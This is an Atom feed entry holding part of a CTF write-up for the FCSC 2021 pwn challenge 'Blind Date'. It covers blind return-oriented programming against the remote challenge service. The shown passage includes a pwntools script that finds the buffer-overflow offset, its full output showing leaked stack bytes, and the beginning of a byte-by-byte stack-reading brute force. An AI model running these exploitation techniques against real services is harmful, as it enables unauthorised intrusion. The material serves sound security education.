<?xml version="1.0" encoding="utf-8"?> 
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[n4sm on repr]]></title>
    
        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
    
    
    
            <link href="https://nasm.re/tags/n4sm/" rel="alternate" type="text/html" title="HTML" />
            <link href="https://nasm.re/tags/n4sm/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
    <updated>2022-07-29T03:08:28+02:00</updated>
    
        <author>
            <name>nasm</name>
            
                <email>nasm@pm.me</email>
            </author>
        
    <id>https://nasm.re/tags/n4sm/</id>
        
        <entry>
            <title type="html"><![CDATA[[FCSC 2021 - pwn] Blind Date]]></title>
            <link href="https://nasm.re/posts/blindate/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/blindate/</id>
            
            <published>2021-05-03T00:00:00+00:00</published>
            <updated>2021-05-03T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="blind-date-489-pts">
        Blind Date (489 pts)
        <a data-clipboard-text="https://nasm.re/posts/blindate/#blind-date-489-pts" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Blind Date (489 pts)" href="#blind-date-489-pts">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<blockquote>
<p>Une société souhaite créer un service en ligne protégeant les informations de ses clients. Pouvez-vous leur montrer qu&rsquo;elle n&rsquo;est pas sûre en lisant le fichier flag.txt sur leur serveur ? Les gérants de cette société n&rsquo;ont pas souhaité vous donner ni le code source de leur solution, ni le binaire compilé, mais ils vous proposent uniquement un accès distant à leur service.</p>
</blockquote>
<blockquote>
<p>nc challenges2.france-cybersecurity-challenge.fr 4008</p>
</blockquote>
<p>Blind Date is a blind rop challenge I did during the <a
  class="gblog-markdown__link"
  href="https://www.france-cybersecurity-challenge.fr"
  
  >FCSC event</a
>.
So, no source code is provided, we juste have a netcat to which we can interact.</p>
<p>To solve this challenge I juste read carefully <a
  class="gblog-markdown__link"
  href="https://www.scs.stanford.edu/brop/bittau-brop.pdf"
  
  >this paper</a
> and applied one per one the techniques described.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="find-the-right-offset">
        Find the right offset
        <a data-clipboard-text="https://nasm.re/posts/blindate/#find-the-right-offset" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Find the right offset" href="#find-the-right-offset">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>The first thing to do is to find from which offset the binary crashes, to do so I developped a small script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span><span class="p">,</span> <span class="mi">4008</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">jmp</span><span class="p">(</span><span class="n">av</span><span class="p">):</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">av</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">5.0</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">find_padding</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] sending: </span><span class="si">{</span><span class="n">padding</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">jmp</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">while</span> <span class="sa">b</span><span class="s2">&#34;Hello you.</span><span class="se">\n</span><span class="s2">What is your name ?</span><span class="se">\n</span><span class="s2">&gt;&gt;&gt; Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">find_padding</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">padding</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">padding</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># minus one char because we do not want that padding overwrite the return address / canary / triggering a crash</span>

<span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">find_padding</span><span class="p">()))</span>
</code></pre></div><p>It&rsquo;s basically sending checking if the right string is always received, and when it&rsquo;s not the case it assumes the remote program crashed and return the corresponding padding. We do not check to see if it prints <code>Bye!</code> right after the <code>Thanks input</code> because it sounds to be a puts which prints NULL byte terminated strings which makes that we can overlap some local pointers and print them like below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x907:EL\xd3\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\xda5r^\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s2">&#34;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;\xad\xe9\x7fBye!\n&#34;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xd6\x97\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc1\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xe3\xb0\xff\xff\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc6\x15\x12\xfc\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x05\x1e\xfc\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9a\xfe\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xfd\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xe0\xa8\x8bn\xfd\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7f\xc6\xd8\xfe\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcd\n\xfd\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x97\xfd\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xfe\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc\x06@Bye!\n&#39;</span>
<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="m">40</span>
</code></pre></div><p>So now we know that we need 40 bytes of padding before the crash.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="stack-reading">
        Stack reading
        <a data-clipboard-text="https://nasm.re/posts/blindate/#stack-reading" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Stack reading" href="#stack-reading">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>Stack reading is just basically a bruteforce of some bytes to trigger the orginal behaviour of the program. It permits especially to leak a stack canary or some saved instruction pointers. But I directly tried to find some stop gadgets, to do so, I&rsquo;m looking for something in the response. And the best stop gadget would be a unique pattern.</p>
<p>I developped this small function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">leak2</span><span class="p">(</span><span class="n">padding</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">leak1</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">leak1</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="c1"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
